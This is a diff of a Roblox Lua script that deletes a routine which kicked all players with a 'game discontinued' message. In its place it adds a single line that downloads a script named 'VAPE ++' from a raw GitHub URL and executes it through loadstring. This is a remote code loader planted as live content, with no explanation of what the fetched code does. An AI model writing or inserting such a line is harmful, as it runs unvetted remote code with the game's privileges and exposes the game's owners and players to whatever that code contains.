@@ -1,15 +1,1 @@
--- Configuration
-local DISCONTINUE_MESSAGE = "This game has been discontinued. Thank you for playing!"
-
--- Function to handle the kick
-local function kickPlayer(player)
-    player:Kick(DISCONTINUE_MESSAGE)
-end
-
--- 1. Kick players who are already in the server when the script runs
-for _, player in ipairs(game.Players:GetPlayers()) do
-    kickPlayer(player)
-end
-
--- 2. Kick any new players who try to join
-game.Players.PlayerAdded:Connect(kickPlayer)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RisenVessel/VAPE-/refs/heads/main/VAPE%20%2B%2B"))()
